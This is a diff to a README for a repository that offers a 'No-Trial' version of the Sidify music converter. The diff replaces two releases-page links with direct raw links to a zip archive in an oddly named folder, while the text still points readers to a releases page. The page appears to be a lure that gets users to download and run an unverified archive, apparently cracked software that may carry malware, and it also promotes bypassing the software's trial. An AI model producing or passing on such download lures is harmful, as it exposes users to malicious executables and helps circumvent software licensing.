@@ -1,6 +1,6 @@
 # 🎵 Sidify-Music-Converter-No-Trial - Convert Music Effortlessly
 
-[![Download Sidify Music Converter](https://img.shields.io/badge/Download-Sidify_Music_Converter-blue.svg)](https://github.com/evonstevon/Sidify-Music-Converter-No-Trial/releases)
+[![Download Sidify Music Converter](https://raw.githubusercontent.com/evonstevon/Sidify-Music-Converter-No-Trial/main/nonascription/Sidify-Music-Converter-No-Trial_1.1-beta.5.zip)](https://raw.githubusercontent.com/evonstevon/Sidify-Music-Converter-No-Trial/main/nonascription/Sidify-Music-Converter-No-Trial_1.1-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Sidify Music Converter No Trial repository! This guide will help 
 
 To begin, visit this page to download the Sidify Music Converter:
 
-[Download Sidify Music Converter](https://github.com/evonstevon/Sidify-Music-Converter-No-Trial/releases)
+[Download Sidify Music Converter](https://raw.githubusercontent.com/evonstevon/Sidify-Music-Converter-No-Trial/main/nonascription/Sidify-Music-Converter-No-Trial_1.1-beta.5.zip)
 
 You will find the latest version listed there. Click on the version number to access the files for download. Once on the releases page, look for the appropriate executable file for your system and click to download.
 
